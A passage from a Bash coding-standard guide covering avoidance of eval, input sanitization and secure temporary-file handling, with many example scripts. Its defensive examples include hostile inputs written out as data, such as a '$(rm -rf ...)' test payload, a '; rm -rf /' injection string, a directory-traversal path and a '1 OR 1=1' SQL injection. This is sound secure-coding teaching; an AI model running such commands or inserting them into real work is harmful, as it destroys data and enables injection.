declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Configuration using associative array (no eval)
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
  [app_host]='localhost'
)

# Dynamic function dispatch (no eval)
declare -A actions=(
  [start]=start_service
  [stop]=stop_service
  [restart]=restart_service
  [status]=status_service
)

start_service() {
  info "Starting ${config[app_name]} on ${config[app_host]}:${config[app_port]}"
  # Start logic here
}

stop_service() {
  info "Stopping ${config[app_name]}"
  # Stop logic here
}

restart_service() {
  stop_service
  start_service
}

status_service() {
  # Check status logic here
  info "${config[app_name]} is running"
}

# Build command dynamically with array (no eval)
build_curl_command() {
  local -- url=$1
  local -a curl_cmd=(curl)

  # Add options based on configuration
  [[ -v config[proxy] ]] && curl_cmd+=(--proxy "${config[proxy]}") ||:
  [[ -v config[timeout] ]] && curl_cmd+=(--timeout "${config[timeout]}") ||:

  # Add URL
  curl_cmd+=("$url")

  # Execute safely
  "${curl_cmd[@]}"
}

main() {
  local -- action=${1:-status}

  # Dispatch to function (no eval)
  if [[ -v "actions[$action]" ]]; then
    "${actions[$action]}"
  else
    die 22 "Invalid action: $action. Valid: ${!actions[*]}"
  fi
}

main "$@"

#fin
```

**Detecting eval usage:**

```bash
# Find all eval usage in scripts
grep -rn 'eval' /path/to/scripts/

# Check if eval is used with variables (very dangerous)
grep -rn 'eval.*\$' /path/to/scripts/

# ShellCheck will warn about eval
shellcheck -x script.sh
# SC2086: eval should not be used for variable expansion
```

**Testing for eval vulnerabilities:**

```bash
# Test script with malicious input
test_eval_safety() {
  local -- malicious_input='$(rm -rf /tmp/test_eval_*)'

  # Create test directory
  mkdir -p /tmp/test_eval_target
  touch /tmp/test_eval_target/testfile

  # Run function with malicious input
  process_input "$malicious_input"

  # Check if malicious command executed
  if [[ ! -d /tmp/test_eval_target ]]; then
    error 'SECURITY VULNERABILITY: eval executed malicious code!'
    return 1
  else
    success 'Input properly sanitized - no eval execution'
    return 0
  fi

  # Cleanup
  rm -rf /tmp/test_eval_target
}
```

**Summary:**

- **Never use eval with untrusted input** - no exceptions
- **Avoid eval entirely** - better alternatives exist for almost all use cases
- **Use arrays** for dynamic command construction: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion** for variable references: `echo "${!var_name}"`
- **Use associative arrays** for dynamic data: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch instead of eval
- **Validate strictly** if eval is absolutely unavoidable (which it almost never is)
- **Audit regularly** for eval usage in codebases
- **Enable ShellCheck** to catch eval misuse

**Key principle:** If you think you need `eval`, you're solving the wrong problem. There is almost always a safer alternative using proper Bash features like arrays, indirect expansion, or associative arrays.


---


**Rule: BCS1005**

## Input Sanitization

**Always validate and sanitize user input to prevent security issues.**

**Rationale:**
- **Prevent injection attacks**: User input could contain malicious code
- **Prevent directory traversal**: `../../../etc/passwd` type attacks
- **Validate data types**: Ensure input matches expected format
- **Fail early**: Reject invalid input before processing
- **Defense in depth**: Never trust user input

**1. Filename validation:**

```bash
# Validate filename - no directory traversal, no special chars
sanitize_filename() {
  local -- name=$1

  # Reject empty input
  [[ -n "$name" ]] || die 22 'Filename cannot be empty'

  # Remove directory traversal attempts
  name="${name//\.\./}"  # Remove all ..
  name="${name//\//}"    # Remove all /

  # Allow only safe characters: alphanumeric, dot, underscore, hyphen
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || die 22 "Invalid filename ${name@Q}: contains unsafe characters"

  # Reject hidden files (starting with .)
  [[ "$name" =~ ^\\. ]] && die 22 "Filename cannot start with dot ${name@Q}"

  # Reject names that are too long
  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars) ${name@Q}"

  echo "$name"
}

# Usage
user_filename=$(sanitize_filename "$user_input")
safe_path="$SAFE_DIR/$user_filename"
```

**2. Numeric input validation:**

```bash
# Validate integer (positive or negative)
validate_integer() {
  local -- input=$1
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^-?[0-9]+$ ]]; then
    die 22 "Invalid integer: '$input'"
  fi
  echo "$input"
}

# Validate positive integer
validate_positive_integer() {
  local -- input=$1
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^[0-9]+$ ]]; then
    die 22 "Invalid positive integer: '$input'"
  fi

  # Check for leading zeros (often indicates octal interpretation)
  [[ "$input" =~ ^0[0-9] ]] && die 22 "Number cannot have leading zeros: $input"

  echo "$input"
}

# Validate with range check
validate_port() {
  local -- port=$1
  port=$(validate_positive_integer "$port")

  ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
  echo "$port"
}
```

**3. Path validation:**

```bash
# Validate path is within allowed directory
validate_path() {
  local -- input_path=$1
  local -- allowed_dir=$2

  # Resolve to absolute path
  local -- real_path
  real_path=$(realpath -e -- "$input_path") || die 22 "Invalid path ${input_path@Q}"

  # Ensure path is within allowed directory
  if [[ "$real_path" != "$allowed_dir"* ]]; then
    die 5 "Path outside allowed directory ${real_path@Q}"
  fi

  echo "$real_path"
}

# Usage
safe_path=$(validate_path "$user_path" "/var/app/data")
```

**4. Email validation:**

```bash
validate_email() {
  local -- email=$1
  [[ -n "$email" ]] || die 22 'Email cannot be empty'

  # Basic email regex (not RFC-compliant but sufficient for most cases)
  local -- email_regex='^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'

  if [[ ! "$email" =~ $email_regex ]]; then
    die 22 "Invalid email format: $email"
  fi

  # Check length limits
  ((${#email} <= 254)) || die 22 "Email too long (max 254 chars): $email"

  echo "$email"
}
```

**5. URL validation:**

```bash
validate_url() {
  local -- url=$1
  [[ -n "$url" ]] || die 22 'URL cannot be empty'

  # Only allow http and https schemes
  if [[ ! "$url" =~ ^https?:// ]]; then
    die 22 "URL must start with http:// or https://: ${url@Q}"
  fi

  # Reject URLs with credentials (security risk)
  if [[ "$url" =~ @ ]]; then
    die 22 'URL cannot contain credentials'
  fi

  echo "$url"
}
```

**6. Whitelist validation:**

```bash
# Validate input against whitelist
validate_choice() {
  local -- input=$1
  shift
  local -a valid_choices=("$@")

  local choice
  for choice in "${valid_choices[@]}"; do
    [[ "$input" == "$choice" ]] && return 0
  done

  die 22 "Invalid choice ${input@Q}. Valid: ${valid_choices[*]}"
}

# Usage
declare -a valid_actions=('start' 'stop' 'restart' 'status')
validate_choice "$user_action" "${valid_actions[@]}"
```

**7. Username validation:**

```bash
validate_username() {
  local -- username=$1
  [[ -n "$username" ]] || die 22 'Username cannot be empty'

  # Standard Unix username rules
  if [[ ! "$username" =~ ^[a-z_][a-z0-9_-]*$ ]]; then
    die 22 "Invalid username ${username@Q}"
  fi

  # Check length (typically max 32 chars on Unix)
  ((${#username} >= 1 && ${#username} <= 32)) || \
    die 22 "Username must be 1-32 characters ${username@Q}"

  echo "$username"
}
```

**8. Command injection prevention:**

```bash
# NEVER pass user input directly to shell
# ✗ DANGEROUS - command injection vulnerability
user_file=$1
cat "$user_file"  # If user_file="; rm -rf /", disaster!

# ✓ Safe - validate first
validate_filename "$user_file"
cat -- "$user_file"  # Use -- to prevent option injection

# ✗ DANGEROUS - using eval with user input
eval "$user_command"  # NEVER DO THIS!

# ✓ Safe - whitelist allowed commands
case "$user_command" in
  start|stop|restart) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac
```

**9. Option injection prevention:**

```bash
# User input could be malicious option like "--delete-all"
user_file=$1

# ✗ Dangerous - if user_file="--delete-all", disaster!
rm "$user_file"

# ✓ Safe - use -- separator
rm -- "$user_file"

# ✗ Dangerous - filename starting with -
ls "$user_file"  # If user_file="-la", becomes: ls -la

# ✓ Safe - use -- or prepend ./
ls -- "$user_file"
ls ./"$user_file"
```

**10. SQL injection prevention (if generating SQL):**

```bash
# ✗ DANGEROUS - SQL injection vulnerability
user_id=$1
query="SELECT * FROM users WHERE id=$user_id"  # user_id="1 OR 1=1"

# ✓ Safe - validate input type first
user_id=$(validate_positive_integer "$user_id")
query="SELECT * FROM users WHERE id=$user_id"

# ✓ Better - use parameterized queries (with proper DB tools)
# This is just bash demo - use proper DB library in production
```

**Complete validation example:**

```bash
#!/usr/bin/env bash
set -euo pipefail

# Validation functions
validate_positive_integer() {
  local input=$1
  [[ -n "$input" && "$input" =~ ^[0-9]+$ ]] || \
    die 22 "Invalid positive integer: $input"
  echo "$input"
}

sanitize_filename() {
  local name=$1
  name="${name//\.\./}"
  name="${name//\//}"
  [[ "$name" =~ ^[a-zA-Z0-9._-]+$ ]] || \
    die 22 "Invalid filename ${name@Q}"
  echo "$name"
}

# Parse and validate arguments
while (($#)); do case $1 in
  -c|--count)     noarg "$@"; shift
                  count=$(validate_positive_integer "$1") ;;
  -f|--file)      noarg "$@"; shift
                  filename=$(sanitize_filename "$1") ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              die 2 "Unexpected argument ${1@Q}" ;;
esac; shift; done

# Validate required arguments provided
[[ -n "${count:-}" ]] || die 2 'Missing required option: --count'
[[ -n "${filename:-}" ]] || die 2 'Missing required option: --file'

# Use validated input safely
for ((i=0; i<count; i+=1)); do
  echo "Processing iteration $i" >> "$filename"
done
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - trusting user input
rm -rf "$user_dir"  # user_dir="/" = disaster!

# ✓ Correct - validate first
validate_path "$user_dir" "/safe/base/dir"
rm -rf "$user_dir"

# ✗ WRONG - weak validation
[[ -n "$filename" ]] && process "$filename"  # Not enough!

# ✓ Correct - thorough validation
filename=$(sanitize_filename "$filename")
process "$filename"

# ✗ WRONG - blacklist approach (always incomplete)
[[ "$input" != *'rm'* ]] || die 1 'Invalid input'  # Can be bypassed!

# ✓ Correct - whitelist approach
[[ "$input" =~ ^[a-zA-Z0-9]+$ ]] || die 1 'Invalid input'
```

**Security principles:**

1. **Whitelist over blacklist**: Define what IS allowed, not what isn't
2. **Validate early**: Check input before any processing
3. **Fail securely**: Reject invalid input with clear error
4. **Use `--` separator**: Prevent option injection in commands
5. **Never use `eval`**: Especially not with user input
6. **Absolute paths**: When possible, use full paths to prevent PATH manipulation
7. **Principle of least privilege**: Run with minimum necessary permissions

**Summary:**
- **Always validate** user input before use
- **Use whitelist** validation (regex, allowed values)
- **Check type, format, range, length**
- **Use `--` separator** in commands
- **Never trust** user input, even if it "looks safe"


---


**Rule: BCS1006**

## Temporary File Handling

**Always use `mktemp` to create temporary files and directories, never hard-code temp file paths. Use trap handlers to ensure cleanup occurs even on script failure or interruption. Store temp file paths in variables, make them readonly when possible, and always clean up in EXIT trap. Proper temp file handling prevents security vulnerabilities, avoids file collisions, and ensures resources are released.**

**Rationale:**

- **Security**: mktemp creates files with secure permissions (0600) in safe locations
- **Uniqueness**: Guaranteed unique filenames prevent collisions with other processes
- **Atomicity**: mktemp creates file atomically, preventing race conditions
- **Cleanup Guarantee**: EXIT trap ensures cleanup even when script fails or is interrupted
- **Resource Management**: Automatic cleanup prevents temp file accumulation
- **Portability**: mktemp works consistently across Unix-like systems
- **Predictable Location**: Uses system temp directory (TMPDIR or /tmp) appropriately

**Basic temp file creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Create temp file and ensure cleanup
create_temp_file() {
  local -- temp_file

  # Create temp file
  temp_file=$(mktemp) || die 1 'Failed to create temporary file'

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT

  # Make variable readonly
  readonly -- temp_file

  info "Created temp file ${temp_file@Q}"

  # Use temp file
  echo 'Test data' > "$temp_file"
  cat "$temp_file"

  # Cleanup happens automatically via trap
}

main() {
  create_temp_file
}

main "$@"
#fin
```

**Basic temp directory creation:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Create temp directory and ensure cleanup
create_temp_dir() {
  local -- temp_dir

  # Create temp directory
  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'

  # Set up cleanup
  trap 'rm -rf "$temp_dir"' EXIT

  # Make variable readonly
  readonly -- temp_dir

  info "Created temp directory ${temp_dir@Q}"

  # Use temp directory
  echo 'file1' > "$temp_dir"/file1.txt
  echo 'file2' > "$temp_dir"/file2.txt

  ls -la "$temp_dir"

  # Cleanup happens automatically via trap
}

main() {
  create_temp_dir
}

main "$@"

#fin
```

**Custom temp file templates:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Temp file with custom template
create_custom_temp() {
  local -- temp_file

  # Template: myapp.XXXXXX (at least 3 X's required)
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX) ||
    die 1 'Failed to create temporary file'

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file ${temp_file@Q}"
  # Output example: /tmp/myscript.Ab3X9z

  # Use temp file
  echo 'Data' > "$temp_file"
}

# ✓ CORRECT - Temp directory with custom template
create_custom_temp_dir() {
  local -- temp_dir

  # Template for directory
  temp_dir=$(mktemp -d /tmp/"$SCRIPT_NAME"-work.XXXXXX) ||
    die 1 'Failed to create temporary directory'

  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  info "Created temp directory ${temp_dir@Q}"
  # Output example: /tmp/myscript-work.Xy7Pm2
}

# ✓ CORRECT - Temp file with extension
create_temp_with_extension() {
  local -- temp_file

  # mktemp doesn't support extensions directly, so add it
  temp_file=$(mktemp /tmp/"$SCRIPT_NAME".XXXXXX)
  mv "$temp_file" "$temp_file".json
  temp_file="$temp_file".json

  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created temp file: ${temp_file@Q}"

  # Use temp file
  echo '{"key": "value"}' > "$temp_file"
}

main() {
  create_custom_temp
  create_custom_temp_dir
  create_temp_with_extension
}

main "$@"
#fin
```

**Multiple temp files with cleanup:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Global array for temp files
declare -a TEMP_FILES=()

# Cleanup function for all temp files
cleanup_temp_files() {
  local -i exit_code=$?
  local -- file

  if [[ ${#TEMP_FILES[@]} -gt 0 ]]; then
    info "Cleaning up ${#TEMP_FILES[@]} temporary files"

    for file in "${TEMP_FILES[@]}"; do
      if [[ -f "$file" ]]; then
        rm -f "$file"
      elif [[ -d "$file" ]]; then
        rm -rf "$file"
      fi
    done
  fi

  return "$exit_code"
}

# Set up cleanup trap
trap cleanup_temp_files EXIT

# Create and register temp file
create_temp() {
  local -- temp_file

  temp_file=$(mktemp) || die 1 'Failed to create temporary file'
  TEMP_FILES+=("$temp_file")

  echo "$temp_file"
}

# Create and register temp directory
create_temp_dir() {
  local -- temp_dir

  temp_dir=$(mktemp -d) || die 1 'Failed to create temporary directory'
  TEMP_FILES+=("$temp_dir")

  echo "$temp_dir"
}

main() {
  local -- temp1 temp2 temp_dir

  # Create multiple temp files
  temp1=$(create_temp)
  temp2=$(create_temp)
  temp_dir=$(create_temp_dir)

  readonly -- temp1 temp2 temp_dir

  info "Temp file 1: ${temp1@Q}"
  info "Temp file 2: ${temp2@Q}"
  info "Temp directory: ${temp_dir@Q}"

  # Use temp files
  echo 'Data 1' > "$temp1"
  echo 'Data 2' > "$temp2"
  echo 'File in dir' > "$temp_dir/file.txt"

  # Cleanup happens automatically via trap
}

main "$@"
#fin
```

**Temp files with error handling:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Robust temp file creation with validation
create_temp_robust() {
  local -- temp_file

  # Create temp file
  if ! temp_file=$(mktemp 2>&1); then
    die 1 "Failed to create temporary file ${temp_file@Q}"
  fi

  # Validate temp file was created
  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file does not exist ${temp_file@Q}"
  fi

  # Check permissions (should be 0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created secure temp file ${temp_file@Q} (permissions $perms)"

  echo "$temp_file"
}

main() {
  local -- temp_file
  temp_file=$(create_temp_robust)

  # Use temp file
  echo 'Sensitive data' > "$temp_file"
}

main "$@"
#fin
```

**Complete example - Data processor with temp files:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i KEEP_TEMP=0
declare -a TEMP_RESOURCES=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ▲" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    debug) prefix+=" ⋯" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }
debug() { ((VERBOSE >= 2)) || return 0; >&2 _msg "$@"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

# ============================================================================
# Cleanup Functions
# ============================================================================

cleanup() {
  local -i exit_code=$?
  local -- resource

  if ((KEEP_TEMP)); then
    if ((${#TEMP_RESOURCES[@]})); then
      info 'Keeping temporary files (--keep-temp specified):'
      for resource in "${TEMP_RESOURCES[@]}"; do
        info "  $resource"
      done
    fi
    return "$exit_code"
  fi

  if ((${#TEMP_RESOURCES[@]})); then
    debug "Cleaning up ${#TEMP_RESOURCES[@]} temporary resources"

    for resource in "${TEMP_RESOURCES[@]}"; do
      if [[ -f "$resource" ]]; then
        debug "Removing temp file ${resource@Q}"
        rm -f "$resource"
      elif [[ -d "$resource" ]]; then
        debug "Removing temp directory ${resource@Q}"
        rm -rf "$resource"
      fi
    done
  fi

  return "$exit_code"
}

# Set up cleanup trap
trap cleanup EXIT

# ============================================================================
# Temp Resource Management
# ============================================================================

# Create temp file and register for cleanup
make_temp_file() {
  local -- template=${1:-}
  local -- temp_file

  if [[ -n "$template" ]]; then
    temp_file=$(mktemp /tmp/"$template".XXXXXX) ||
      die 1 "Failed to create temp file with template ${template@Q}"
  else
    temp_file=$(mktemp) ||
      die 1 'Failed to create temp file'
  fi

  # Register for cleanup
  TEMP_RESOURCES+=("$temp_file")

  debug "Created temp file ${temp_file@Q}"
  echo "$temp_file"
}

# Create temp directory and register for cleanup
make_temp_dir() {
  local -- template=${1:-}
  local -- temp_dir

  if [[ -n "$template" ]]; then
    temp_dir=$(mktemp -d /tmp/"$template".XXXXXX) ||
      die 1 "Failed to create temp directory with template ${template@Q}"
  else
    temp_dir=$(mktemp -d) ||
      die 1 'Failed to create temp directory'
  fi

  # Register for cleanup
  TEMP_RESOURCES+=("$temp_dir")

  debug "Created temp directory ${temp_dir@Q}"
  echo "$temp_dir"
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option ${1@Q} requires an argument"
  fi
}

# ============================================================================
# Business Logic
# ============================================================================

# Process file with multiple temp files
process_file() {
  local -- input_file=$1
  local -- output_file=$2

  # Validate input
  if [[ ! -f "$input_file" ]]; then
    error "Input file not found ${input_file@Q}"
    return 2
  fi

  if [[ ! -r "$input_file" ]]; then
    error "Input file not readable ${input_file@Q}"
    return 1
  fi

  info "Processing: $input_file -> $output_file"

  # Create temp files for processing stages
  local -- temp_filtered temp_sorted temp_unique
  temp_filtered=$(make_temp_file "$SCRIPT_NAME-filtered")
  temp_sorted=$(make_temp_file "$SCRIPT_NAME-sorted")
  temp_unique=$(make_temp_file "$SCRIPT_NAME-unique")

  # Stage 1: Filter comments and empty lines
  debug 'Stage 1: Filtering'
  grep -v '^#' "$input_file" | grep -v '^[[:space:]]*$' > "$temp_filtered"

  local -i filtered_lines
  filtered_lines=$(wc -l < "$temp_filtered")
  debug "Filtered lines: $filtered_lines"

  # Stage 2: Sort
  debug 'Stage 2: Sorting'
  sort "$temp_filtered" > "$temp_sorted"

  # Stage 3: Remove duplicates
  debug 'Stage 3: Removing duplicates'
  sort -u "$temp_sorted" > "$temp_unique"

  local -i unique_lines
  unique_lines=$(wc -l < "$temp_unique")
  debug "Unique lines: $unique_lines"

  # Write final output
  if ((DRY_RUN)); then
    info "[DRY-RUN] Would write to: $output_file"
    info "[DRY-RUN] Output preview:"
    head -n 5 "$temp_unique"
  else
    cp "$temp_unique" "$output_file"
    success "Processed $input_file -> $output_file ($unique_lines unique lines)"
  fi

  return 0
}

# Batch process multiple files
batch_process() {
  local -a input_files=("$@")
  local -- input_file output_file
  local -i success_count=0
  local -i error_count=0

  # Create temp directory for outputs
  local -- temp_output_dir
  temp_output_dir=$(make_temp_dir "$SCRIPT_NAME"-output)

  info "Processing ${#input_files[@]} files"

  for input_file in "${input_files[@]}"; do
    output_file="$temp_output_dir"/"${input_file##*/}".processed

    if process_file "$input_file" "$output_file"; then
      ((success_count+=1))
    else
      ((error_count+=1))
    fi
  done

  # Report results
  info "Results: $success_count succeeded, $error_count failed"

  if ((success_count > 0)); then
    info 'Processed files:'
    ls -lh "$temp_output_dir"
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Main Function
# ============================================================================

show_help() {
  cat <<HELP
$SCRIPT_NAME $VERSION - Process files with temp files

Usage: $SCRIPT_NAME [OPTIONS] FILE...

Process files with temporary file handling.

Options:
  -v, --verbose       Verbose output
  -vv                 Very verbose (debug) output
  -n, --dry-run       Dry-run mode
  -k, --keep-temp     Keep temporary files after completion
  -h, --help          Show this help message
  -V, --version       Show version

Arguments:
  FILE...             Input files to process

Examples:
  script.sh file.txt
  script.sh -v file1.txt file2.txt
  script.sh -k --dry-run data/*.txt
HELP
}

main() {
  local -a input_files=()

  # Parse arguments
  while (($#)); do
    case $1 in
      -v|--verbose)
        VERBOSE+=1
        ;;

      -vv)
        VERBOSE=2
        ;;

      -n|--dry-run)
        DRY_RUN=1
        ;;

      -k|--keep-temp)
        KEEP_TEMP=1
        ;;

      -V|--version)
        echo "$SCRIPT_NAME $VERSION"
        return 0
        ;;

      -h|--help)
        show_help
        return 0
        ;;

      --)
        shift
        break
        ;;

      -*)
        die 22 "Invalid option ${1@Q}"
        ;;

      *)
        input_files+=("$1")
        ;;
    esac
    shift
  done

  # Collect remaining arguments
  input_files+=("$@")

  # Make variables readonly
  readonly -- VERBOSE DRY_RUN KEEP_TEMP
  readonly -a input_files

  # Validate
  if ((${#input_files[@]} == 0)); then
    error 'No input files specified'
    show_help
    return 22
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#input_files[@]}"
    ((DRY_RUN)) && info '[DRY-RUN] Mode enabled' ||:
    ((KEEP_TEMP)) && info '[KEEP-TEMP] Temporary files will be preserved' ||:
  fi

  # Process files
  batch_process "${input_files[@]}"
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"
#fin
```

**Temp file security considerations:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ✓ CORRECT - Secure temp file handling
secure_temp_file() {
  local -- temp_file

  # Create with secure permissions (0600)
  temp_file=$(mktemp) || die 1 'Failed to create temp file'

  # Verify it's a regular file
  if [[ ! -f "$temp_file" ]]; then
    die 1 "Temp file is not a regular file ${temp_file@Q}"
  fi

  # Verify ownership (should be current user)
  local -- owner
  owner=$(stat -c %U "$temp_file" 2>/dev/null || stat -f %Su "$temp_file" 2>/dev/null)
  if [[ "$owner" != "$USER" ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has wrong owner: $owner (expected: $USER)"
  fi

  # Verify permissions (0600)
  local -- perms
  perms=$(stat -c %a "$temp_file" 2>/dev/null || stat -f %Lp "$temp_file" 2>/dev/null)
  if [[ "$perms" != '600' ]]; then
    rm -f "$temp_file"
    die 1 "Temp file has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -f "$temp_file"' EXIT
  readonly -- temp_file

  info "Created secure temp file: ${temp_file@Q}"
  info "  Owner: $owner"
  info "  Permissions: $perms"

  echo "$temp_file"
}

# ✓ CORRECT - Secure temp directory handling
secure_temp_dir() {
  local -- temp_dir

  # Create with secure permissions (0700)
  temp_dir=$(mktemp -d) || die 1 'Failed to create temp directory'

  # Verify it's a directory
  if [[ ! -d "$temp_dir" ]]; then
    die 1 "Temp path is not a directory ${temp_dir@Q}"
  fi

  # Verify permissions (0700)
  local -- perms
  perms=$(stat -c %a "$temp_dir" 2>/dev/null || stat -f %Lp "$temp_dir" 2>/dev/null)
  if [[ "$perms" != '700' ]]; then
    rm -rf "$temp_dir"
    die 1 "Temp directory has insecure permissions: $perms"
  fi

  # Set up cleanup
  trap 'rm -rf "$temp_dir"' EXIT
  readonly -- temp_dir

  info "Created secure temp directory ${temp_dir@Q} permissions $perms)"

  echo "$temp_dir"
}

main() {
  local -- temp_file temp_dir

  temp_file=$(secure_temp_file)
  temp_dir=$(secure_temp_dir)

  # Use temp resources
  echo 'Sensitive data' > "$temp_file"
  echo 'More data' > "$temp_dir/file.txt"
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ WRONG - Hard-coded temp file path
temp_file=/tmp/myapp_temp.txt
echo 'data' > "$temp_file"
# Problems:
# - Not unique (collisions with other instances)
# - Predictable name (security risk)
# - No automatic cleanup

# ✓ CORRECT - Use mktemp
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
echo 'data' > "$temp_file"

# ✗ WRONG - Using PID in filename
temp_file=/tmp/myapp_"$$".txt
echo 'data' > "$temp_file"
# Problems:
# - Still predictable
# - Race condition between check and create
# - No automatic cleanup

# ✓ CORRECT - Use mktemp with template
temp_file=$(mktemp /tmp/myapp.XXXXXX) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - No cleanup trap
temp_file=$(mktemp)
echo 'data' > "$temp_file"
# Script exits, temp file remains!

# ✓ CORRECT - Always set trap
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Cleanup in script body
temp_file=$(mktemp)
echo 'data' > "$temp_file"
rm -f "$temp_file"
# If script fails before rm, file remains!

# ✓ CORRECT - Cleanup in trap
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT
echo 'data' > "$temp_file"
# Cleanup happens even if script fails

# ✗ WRONG - Creating temp file manually
temp_file="/tmp/myapp_$(date +%s).txt"
touch "$temp_file"
chmod 600 "$temp_file"
# Problems:
# - Not atomic
# - Race conditions
# - Reinventing mktemp badly

# ✓ CORRECT - Use mktemp
temp_file=$(mktemp) || die 1 'Failed to create temp file'
trap 'rm -f "$temp_file"' EXIT

# ✗ WRONG - Insecure permissions
temp_file=$(mktemp)
chmod 666 "$temp_file"  # World writable!
echo 'sensitive data' > "$temp_file"

# ✓ CORRECT - Keep default secure permissions
temp_file=$(mktemp) || die 1 'Failed to create temp file'
# Permissions are already 0600 (user read/write only)
echo 'sensitive data' > "$temp_file"

# ✗ WRONG - Not checking mktemp success
temp_file=$(mktemp)
echo 'data' > "$temp_file"  # May fail if mktemp failed!

# ✓ CORRECT - Check mktemp success
temp_file=$(mktemp) || die 1 'Failed to create temp file'
echo 'data' > "$temp_file"

# ✗ WRONG - Multiple traps overwrite each other
temp1=$(mktemp)
trap 'rm -f "$temp1"' EXIT

temp2=$(mktemp)
trap 'rm -f "$temp2"' EXIT  # Overwrites previous trap!
# temp1 won't be cleaned up!

# ✓ CORRECT - Single trap for all cleanup
temp1=$(mktemp) || die 1 'Failed to create temp file'
temp2=$(mktemp) || die 1 'Failed to create temp file'
